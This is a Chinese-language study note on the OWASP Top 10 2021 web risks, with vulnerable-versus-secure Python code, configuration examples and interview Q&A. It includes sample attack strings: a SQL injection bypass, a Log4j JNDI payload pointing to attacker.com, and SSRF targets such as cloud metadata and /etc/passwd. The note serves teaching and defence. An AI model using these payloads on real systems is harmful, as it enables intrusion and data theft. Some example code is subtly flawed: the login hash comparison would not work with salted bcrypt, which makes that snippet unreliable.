# OWASP Top 10 2021

## 版权声明

> **Copyright Notice**: 本文档为个人学习笔记，内容整理自公开技术资料、OWASP官方文档及业界最佳实践。引用内容均已标注来源。如有侵权请联系作者移除。
>
> **License**: 本笔记采用 [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) 知识共享许可协议 - 非商业性使用 - 相同方式共享。

---

## 概述

**OWASP Top 10** 是由 Open Web Application Security Project（开放式Web应用程序安全项目）发布的Web应用安全风险清单，每3-4年更新一次。2021版反映了当前最严峻的Web安全威胁，是安全开发、渗透测试和安全审计的重要参考标准。

```
┌─────────────────────────────────────────────────────────────────┐
│                 OWASP Top 10 2021 概览                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   A01 ────────▶ 失效的访问控制 (Broken Access Control)          │
│   A02 ────────▶ 加密机制失效 (Cryptographic Failures)           │
│   A03 ────────▶ 注入攻击 (Injection)                            │
│   A04 ────────▶ 不安全的设计 (Insecure Design)                  │
│   A05 ────────▶ 安全配置错误 (Security Misconfiguration)        │
│   A06 ────────▶ 易受攻击和过时的组件                            │
│                 (Vulnerable and Outdated Components)            │
│   A07 ────────▶ 身份认证失败 (Identification and                │
│                 Authentication Failures)                        │
│   A08 ────────▶ 软件和数据完整性失败                            │
│                 (Software and Data Integrity Failures)          │
│   A09 ────────▶ 安全日志和监控失败                              │
│                 (Security Logging and Monitoring Failures)      │
│   A10 ────────▶ 服务端请求伪造 (SSRF)                           │
│                 (Server-Side Request Forgery)                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## A01: 失效的访问控制 (Broken Access Control)

### 漏洞原理

访问控制强制策略未被正确执行，导致用户可以执行超出其权限的操作。这是2021年排名第一的漏洞，危害性极高。

```
┌─────────────────────────────────────────────────────────────────┐
│                   失效的访问控制类型                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   ┌──────────────┐    ┌──────────────┐    ┌──────────────┐     │
│   │   垂直越权    │    │   水平越权    │    │    IDOR      │     │
│   │  (Vertical)  │    │ (Horizontal) │    │  (不安全的    │     │
│   │              │    │              │    │  直接对象引用)│     │
│   └──────┬───────┘    └──────┬───────┘    └──────┬───────┘     │
│          │                   │                   │              │
│          ▼                   ▼                   ▼              │
│   普通用户获得         访问同级其他         通过修改ID参数      │
│   管理员权限           用户的数据           访问未授权资源      │
│                                                                 │
│   示例：               示例：               示例：               │
│   /admin/users  →     用户A查看          /api/orders/1234      │
│   绕过前端检查          用户B的订单         改为1235            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 攻击示例

```python
# 漏洞代码 - IDOR漏洞
@app.route('/api/orders/<order_id>')
def get_order(order_id):
    # 危险：未验证当前用户是否有权访问该订单
    order = db.execute(f"SELECT * FROM orders WHERE id = {order_id}")
    return jsonify(order)

# 安全代码 - 权限验证
@app.route('/api/orders/<order_id>')
@login_required
def get_order(order_id):
    # 验证所有权
    order = Order.query.filter_by(
        id=order_id, 
        user_id=current_user.id
    ).first()
    
    if not order:
        abort(403, "无权限访问此订单")
    
    return jsonify(order.to_dict())
```

### 防御措施

- 默认拒绝所有访问，显式授权
- 服务端验证权限，不依赖前端隐藏
- 使用间接引用映射（UUID替代自增ID）
- 实施最小权限原则
- 记录所有访问控制失败事件

---

## A02: 加密机制失效 (Cryptographic Failures)

### 漏洞原理

敏感数据因加密错误、弱算法或不当处理而被泄露。原名为"敏感数据泄露"，2021版扩展为更广泛的加密问题。

```
┌─────────────────────────────────────────────────────────────────┐
│                   加密机制失效场景                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   数据传输                    数据存储                    密钥管理│
│   ├─ 明文传输 (HTTP)          ├─ 明文存储密码            ├─ 硬编码│
│   ├─ 弱TLS版本                ├─ 弱哈希算法 (MD5/SHA1)   ├─ 弱随机数│
│   ├─ 无效证书                 ├─ 无盐哈希               └─ 密钥泄露│
│   └─ 不安全的重定向           └─ 旧加密数据                     │
│                                                                 │
│   危险示例：                                                    │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │  import hashlib                                         │   │
│   │  hash = hashlib.md5(password).hexdigest()  # ❌ 危险    │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 安全实践

```python
import bcrypt
import secrets

# 密码哈希 - 使用bcrypt
def hash_password(password: str) -> str:
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt).decode()

def verify_password(password: str, hashed: str) -> bool:
    return bcrypt.checkpw(password.encode(), hashed.encode())

# 安全随机数 - 用于Token生成
def generate_secure_token():
    return secrets.token_urlsafe(32)
```

### 推荐算法

| 用途 | 推荐算法 | 避免使用 |
|------|----------|----------|
| 密码哈希 | bcrypt, Argon2, scrypt | MD5, SHA1, SHA256 |
| 对称加密 | AES-256-GCM | DES, 3DES, ECB模式 |
| 非对称加密 | RSA-2048+, ECDSA P-256 | RSA-1024, 弱曲线 |
| 数据传输 | TLS 1.3 | SSL, TLS 1.0/1.1 |
| 随机数 | secrets模块, /dev/urandom | Math.random() |

---

## A03: 注入攻击 (Injection)

### 漏洞原理

不可信数据被发送到解释器作为命令或查询的一部分，导致执行非预期操作。

```
┌─────────────────────────────────────────────────────────────────┐
│                   注入攻击类型                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   SQL注入              命令注入             NoSQL注入           │
│   ├─ Union-based       ├─ OS命令          ├─ MongoDB注入       │
│   ├─ Error-based       ├─ LDAP注入        ├─ Redis注入         │
│   ├─ Blind (布尔/时间) └─ XPath注入       └─ Elasticsearch     │
│   └─ Stacked queries                                          │
│                                                                 │
│   攻击流程：                                                     │
│   用户输入 ──▶ 拼接命令 ──▶ 解释器执行 ──▶ 非预期结果            │
│                                                                 │
│   示例：' OR '1'='1' --                                         │
│   SELECT * FROM users WHERE username = '' OR '1'='1' -- '       │
│   └─ 永远为真，绕过认证                                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 防御代码

```python
# ❌ 危险 - 字符串拼接
def get_user_unsafe(username):
    query = f"SELECT * FROM users WHERE username = '{username}'"
    return db.execute(query)

# ✅ 安全 - 参数化查询
def get_user_safe(username):
    query = "SELECT * FROM users WHERE username = %s"
    return db.execute(query, (username,))

# ✅ 安全 - 使用ORM
from sqlalchemy.orm import Session

def get_user_orm(db: Session, username: str):
    return db.query(User).filter(User.username == username).first()
```

---

## A04: 不安全的设计 (Insecure Design)

### 漏洞原理

架构和设计层面的安全缺陷，区别于实现错误。包括缺失威胁建模、业务逻辑漏洞等。

```
┌─────────────────────────────────────────────────────────────────┐
│                   不安全的设计模式                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   业务逻辑漏洞              竞态条件              设计反模式      │
│   ├─ 优惠券叠加使用         ├─ TOCTOU            ├─ 信任客户端  │
│   ├─ 负数量商品             ├─ 并发修改           ├─ 安全依赖隐藏│
│   ├─ 价格篡改               └─ 重复提交           ├─ 默认开放   │
│   └─ 流程绕过                                    └─ 过度授权   │
│                                                                 │
│   STRIDE威胁建模：                                               │
│   S-Spoofing(伪装)  T-Tampering(篡改)  R-Repudiation(抵赖)       │
│   I-Information Disclosure(信息泄露)  D-Denial of Service(DoS)   │
│   E-Elevation of Privilege(权限提升)                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 安全设计原则

```python
# 安全设计示例 - 防止竞态条件
from sqlalchemy.exc import IntegrityError

def transfer_funds(from_acc, to_acc, amount):
    """使用数据库事务防止竞态条件"""
    try:
        with db.session.begin():
            # 锁定记录
            source = Account.query.with_for_update().get(from_acc)
            
            if source.balance < amount:
                raise InsufficientFundsError()
            
            source.balance -= amount
            target = Account.query.with_for_update().get(to_acc)
            target.balance += amount
            
    except IntegrityError:
        db.session.rollback()
        raise TransferError("转账失败")
```

---

## A05: 安全配置错误 (Security Misconfiguration)

### 漏洞原理

不安全的默认配置、不完整的临时配置、开放的云存储、配置错误的HTTP头等。

```
┌─────────────────────────────────────────────────────────────────┐
│                   常见配置错误                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   服务器配置                    应用配置                  云配置 │
│   ├─ 默认凭据未更改             ├─ 调试模式启用           ├─ S3公开│
│   ├─ 目录遍历                   ├─ 详细错误信息           ├─ 安全组开放│
│   ├─ 不必要的服务               ├─ 测试代码遗留           ├─ 密钥泄露│
│   └─ 过时软件版本               └─ 不安全HTTP头           └─ 元数据访问│
│                                                                 │
│   常见敏感路径：                                                 │
│   /.git/  /.env  /config.php.bak  /admin  /phpmyadmin           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 安全配置示例

```nginx
# Nginx安全响应头配置
server {
    listen 443 ssl http2;
    
    # 安全头部
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Strict-Transport-Security "max-age=31536000" always;
    add_header Referrer-Policy strict-origin-when-cross-origin;
    
    # CSP
    add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-abc123';";
    
    # 隐藏服务器版本
    server_tokens off;
}
```

---

## A06: 易受攻击和过时的组件 (Vulnerable Components)

### 漏洞原理

使用具有已知漏洞的组件（框架、库、模块），或未及时更新的软件。

```
┌─────────────────────────────────────────────────────────────────┐
│                   组件安全风险                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   已知CVE漏洞              供应链攻击                 许可证风险 │
│   ├─ Log4j (CVE-2021-44228)  ├─ 依赖混淆            ├─ GPL传染  │
│   ├─ Struts2漏洞            ├─ 恶意包上传           ├─ 商业授权  │
│   ├─ Fastjson漏洞           ├─ 劫持公共包           └─ 专利风险  │
│   └─ 过时的依赖             └─ 构建工具漏洞                     │
│                                                                 │
│   Log4j漏洞示例：                                                │
│   ${jndi:ldap://attacker.com/exploit}                           │
│   攻击者输入触发JNDI查找，导致RCE                               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 组件管理

```bash
# 扫描依赖漏洞
npm audit                    # Node.js
pip-audit                    # Python
snyk test                    # 跨平台
OWASP Dependency-Check       # Java

# 生成SBOM (软件物料清单)
syft packages dir:. -o spdx-json > sbom.json
```

---

## A07: 身份认证失败 (Authentication Failures)

### 漏洞原理

与身份认证相关的漏洞，允许攻击者冒充其他用户。

```
┌─────────────────────────────────────────────────────────────────┐
│                   认证失败类型                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   弱密码策略              会话管理缺陷            凭证填充攻击   │
│   ├─ 无复杂度要求         ├─ 会话固定            ├─ 泄露凭证库  │
│   ├─ 无尝试限制           ├─ 会话劫持            ├─ 自动化尝试  │
│   └─ 可预测密码           └─ 超长有效期          └─ 缺乏监控   │
│                                                                 │
│   MFA绕过                密码恢复漏洞            API密钥泄露   │
│   ├─ 暴力破解TOTP         ├─ 弱安全问题          ├─ 硬编码     │
│   ├─ 社交工程             ├─ 可猜测的答案        ├─ 版本控制    │
│   └─ 备份码滥用           └─ 邮件拦截            └─ 日志泄露   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 安全认证实现

```python
from flask_limiter import Limiter
import hmac
import secrets

# 登录限制
limiter = Limiter(key_func=lambda: request.form.get('username'))

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = User.query.filter_by(username=username).first()
    
    # 恒定时间比较防止时序攻击
    if user and hmac.compare_digest(
        user.password_hash, 
        hash_password(password)
    ):
        # 重新生成Session ID防止会话固定
        session.regenerate()
        session['user_id'] = user.id
        return redirect('/dashboard')
    
    # 模糊错误信息
    return '用户名或密码错误'
```

---

## A08: 软件和数据完整性失败 (Software Integrity Failures)

### 漏洞原理

软件更新、关键数据和CI/CD流程中缺乏完整性验证。

```
┌─────────────────────────────────────────────────────────────────┐
│                   完整性失败场景                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   不安全的反序列化              未签名更新              CI/CD漏洞 │
│   ├─ Java原生反序列化           ├─ 自动更新无验证       ├─ 凭据泄露│
│   ├─ Python pickle              ├─ 中间人攻击           ├─ 供应链注入│
│   ├─ PHP object injection       ├─ 回滚攻击             ├─ 配置篡改│
│   └─ Node.js vm/module          └─ 镜像篡改             └─ 权限过大│
│                                                                 │
│   安全替代方案：                                                 │
│   ┌─────────────────────────────────────────────────────────┐   │
│   │  危险              安全替代                               │   │
│   │  pickle.loads()  → json.loads() + schema验证            │   │
│   │  ObjectInputStream → Jackson + 白名单                   │   │
│   │  unserialize()   → json_decode()                        │   │
│   └─────────────────────────────────────────────────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 安全反序列化

```python
# ❌ 危险 - pickle可执行任意代码
import pickle
data = pickle.loads(untrusted_data)

# ✅ 安全 - 使用JSON + 模式验证
import json
from marshmallow import Schema, fields, validate

class UserSchema(Schema):
    username = fields.String(validate=validate.Length(min=3, max=32))
    email = fields.Email()
    age = fields.Integer(validate=validate.Range(min=0, max=150))

schema = UserSchema()
result = schema.loads(json_data)
```

---

## A09: 安全日志和监控失败 (Logging Failures)

### 漏洞原理

关键安全事件未被记录，或监控不足导致攻击无法及时发现。

```
┌─────────────────────────────────────────────────────────────────┐
│                   日志和监控缺陷                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   日志缺陷                      监控缺陷                  存储问题 │
│   ├─ 安全事件未记录             ├─ 无实时监控             ├─ 明文存储│
│   ├─ 格式不统一                 ├─ 无告警机制             ├─ 缺乏保留策略│
│   ├─ 日志注入漏洞               ├─ 阈值设置不当           ├─ 未加密传输│
│   └─ 包含敏感信息               └─ 无日志关联分析         └─ 权限过大│
│                                                                 │
│   应记录的安全事件：                                             │
│   • 登录成功/失败  • 权限变更  • 数据导出  • 配置变更            │
│   • 异常访问模式   • 特权操作  • 安全告警  • 系统错误            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 安全日志实践

```python
import structlog
import hashlib
from datetime import datetime

logger = structlog.get_logger()

def log_security_event(event_type, user_id, details, ip_address):
    """记录安全事件 - 用户ID哈希处理保护隐私"""
    logger.info(
        "security_event",
        event_type=event_type,
        user_id_hash=hashlib.sha256(user_id.encode()).hexdigest()[:16],
        ip_address=ip_address,
        user_agent=request.headers.get('User-Agent', ''),
        timestamp=datetime.utcnow().isoformat(),
        details=details
    )

# 使用示例
@app.route('/login', methods=['POST'])
def login():
    username = sanitize_input(request.form['username'])
    
    if authenticate(username, request.form['password']):
        log_security_event("login_success", username, {}, request.remote_addr)
        return redirect('/dashboard')
    else:
        log_security_event("login_failure", username, 
                          {"reason": "invalid_credentials"}, 
                          request.remote_addr)
        return '登录失败'
```

---

## A10: 服务端请求伪造 (SSRF)

### 漏洞原理

攻击者诱导服务器向攻击者选择的任意域发起请求。

```
┌─────────────────────────────────────────────────────────────────┐
│                   SSRF攻击流程                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   攻击者              目标服务器              内网/云服务         │
│      │                    │                       │             │
│      │ 1. 发送恶意URL      │                       │             │
│      │──────────────────▶ │                       │             │
│      │ ?url=http://       │                       │             │
│      │    169.254.169.254 │                       │             │
│      │                    │ 2. 服务器发起请求      │             │
│      │                    │──────────────────────▶│             │
│      │                    │    获取元数据          │             │
│      │                    │ ◀─────────────────────│             │
│      │ 3. 返回敏感信息     │                       │             │
│      │◀───────────────────│                       │             │
│                                                                 │
│   常见利用目标：                                                 │
│   • 云元数据服务: 169.254.169.254 (AWS, GCP, Azure)              │
│   • 内部服务: localhost, 10.0.0.0/8, 172.16.0.0/12             │
│   • 文件读取: file:///etc/passwd                                │
│   • 端口扫描: 探测内网开放端口                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### SSRF防御

```python
import ipaddress
import urllib.parse
import socket

def is_safe_url(url):
    """检查URL是否安全 - 多层防护"""
    try:
        parsed = urllib.parse.urlparse(url)
        
        # 只允许HTTP/HTTPS
        if parsed.scheme not in ('http', 'https'):
            return False
        
        hostname = parsed.hostname
        if not hostname:
            return False
        
        # 检查IP地址
        try:
            ip = ipaddress.ip_address(hostname)
            # 禁止私有地址
            if ip.is_private or ip.is_loopback or ip.is_reserved:
                return False
        except ValueError:
            # 是域名，检查是否为内部域名
            if hostname in ('localhost', 'metadata.google.internal'):
                return False
            
            # DNS解析检查
            resolved = socket.getaddrinfo(hostname, None)
            for _, _, _, _, sockaddr in resolved:
                ip = ipaddress.ip_address(sockaddr[0])
                if ip.is_private or ip.is_loopback:
                    return False
        
        return True
    except Exception:
        return False

# 使用白名单限制域名
ALLOWED_DOMAINS = ['api.trusted-service.com', 'cdn.example.com']

def fetch_url(url):
    if not is_safe_url(url):
        return "无效的URL", 400
    
    parsed = urllib.parse.urlparse(url)
    if parsed.hostname not in ALLOWED_DOMAINS:
        return "域名不在白名单中", 403
    
    return requests.get(url, timeout=5)
```

---

## 面试要点

### Q1: OWASP Top 10 2021相比2017有哪些变化？

**答**:
- **A01 Broken Access Control** 从第5位上升到第1位
- **A02 Cryptographic Failures** 原名"敏感数据泄露"，范围扩展
- **A04 Insecure Design** 新增类别，关注设计层面
- **A07 Authentication Failures** 认证失败合并了身份识别失败
- **A10 SSRF** 新增，云原生环境下日益严重
- 移除了2017版的：XML外部实体(XXE)、不安全的反序列化、不足的日志记录

### Q2: 如何系统性地防御OWASP Top 10？

**答**:
1. **安全开发生命周期(SDL)**：威胁建模、安全编码、代码审计
2. **纵深防御**：不依赖单一防线，多层控制
3. **默认安全**：安全配置、最小权限
4. **持续监控**：日志记录、异常检测、漏洞扫描
5. **快速响应**：补丁管理、应急响应计划

### Q3: IDOR和水平越权的区别？

**答**:
- **IDOR**：通过修改直接对象引用（如ID参数）访问未授权资源，侧重于技术实现
- **水平越权**：访问同级其他用户的数据，侧重于权限范围
- IDOR通常是水平越权的一种实现方式，但水平越权也可能通过其他方式实现

### Q4: 为什么加密机制失效比敏感数据泄露范围更广？

**答**:
不仅包括敏感数据泄露，还包括：
- 使用弱或过时的加密算法
- 硬编码密钥或弱密钥管理
- 不安全的随机数生成
- 传输层加密配置错误
- 初始化向量(IV)重用

---

## 相关概念

- [SQL注入](./sql-injection.md) - A03详细分析
- [身份认证](../authentication.md) - A07详细分析
- [授权与访问控制](../authorization.md) - A01防御措施
- [常见漏洞](../common-vulnerabilities.md) - 更多漏洞类型
- XSS攻击 - 常见注入攻击
- CSRF防护 - A01相关防御
- [CSRF防护](./csrf.md) - A01相关防御

---

## 参考资料

1. [OWASP Top 10 2021 Official](https://owasp.org/Top10/)
2. [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
3. [CWE/SANS Top 25](https://cwe.mitre.org/top25/)
4. [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
5. [PortSwigger Web Security Academy](https://portswigger.net/web-security)
